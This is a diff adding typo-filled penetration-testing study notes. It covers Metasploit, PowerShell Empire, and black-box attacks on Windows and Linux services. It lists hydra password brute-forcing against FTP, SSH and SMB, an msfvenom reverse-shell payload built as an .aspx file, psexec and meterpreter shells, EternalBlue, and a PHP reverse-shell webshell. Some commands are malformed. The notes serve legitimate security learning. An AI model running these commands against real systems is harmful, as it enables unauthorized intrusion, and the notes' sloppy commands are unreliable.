@@ -102,18 +102,113 @@ nc -nv IP PORT < test.txt file where have
 + Payload of all things Reverse Shellcheat sheet
 + revshells.com
 
-## Exploitation Framework 
+## Metasploit Framework
++ Penetration testing framework
++ Used to automated exploitation phase
++ interface method interacting with metasploit
++ module code that performs a task
++ vulernabiltiy is a weakness
++ exploit code or mopdule used to take adavtage of a vulenrability
++ payload piece of code dleivelriy to remote target to run command or to get remote acess
++ listenting to listen for an incoming conenction
++ information vulenrability auxiliary
++ exploitation - explpoit modules payloads
++ post explitation pivilege post exploitations
+
+## Powershell Empire 
++ Pure Powershell exploitation and post exploitation
++ Powershell empire received an update and is now offically supported by kali user
++ keyloggers to mimikatz
+
++ Starkiller gui frontend for the powershell empire
++ both availbnle for kali linux
+
+## Windows Black Box Penetration Test 
++ Not provide with IP or system ifnormation
++ External no isndie knwoeldge
++ Host Dsicvoery, Port Scanning, Vulenrabiltiy, exploitation Post Exploitation
+## Port Scanning and Enumeration  Windows
++ DEMO IP from /etc/hosts
++ start with nmap
++ ```
+  nmap -T4 -PA -sC -p 1-1000 IP
+  ```
++ Figure out and check out all the ports
+
+## Targeting Microsoft IIS FTP
+```
+ls -al /usr/share/nmap/scripts/ | grep ftp-
+nmap -sV -p 21 --script=ftp-anon IP
+
+hydra -L /usr/share/wordlist/metasploit/unix_user.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ftp
+hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ftp
+msfvenom -p /windows/shell/reverse_tcp LHOST=IP LPORT=1234 -f asp > shell.aspx
+
+msfvenom /use/multi/handler
 
 
+```
+
+## Target Openssh 
+```
+hydra -L /usr/share/wordlist/metasploit/unix_user.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh
+hydra -L administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ssh
 
 
+```
+
+  
+## Target SMB
+```
+nmap -sV -sC -p 445 IP
+hydra -L administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt IP smb
+smbclient -L IP -U username
+smbmap -u username -p password -H IP
+enum4linux -u username -p password -U IP
+
+msfconsole smb_enumusers #list username
+python3 psexec.py username@IP
+msfconsole psexec # payload x64 meterpreter reverse_tcp
+
+eternal blue
+```
+
+## Targeting MYSQL Database Server 
+```
+nmap -sV -sC -p 3306,8585 IP
+
+searchsploit mysql version
+
+msconsole mysql_login unix_password.txt
+
+mysql -u root -p -h IP 
+net stop wampapache
+net start wampapache
+```
+
+## Linux Port Scanning 
+
+```
+nmap -sV -p1-1000 IP -oN nmap_10k.txt
+nc -nv IP PORT
+
+```
+
+## Targeting VSFPTD
+
+```
+ftp IP 21
+
+msfconsole smtp_enum
+
+hydra -l services -P /usr/share/wordlists/metasploit/unix_passwords.txt IP ftp
 
 
+/usr/share/webshells/php/php-reverse-shell.php
+da directory 
 
 
-
-
-
+```
 
 
 
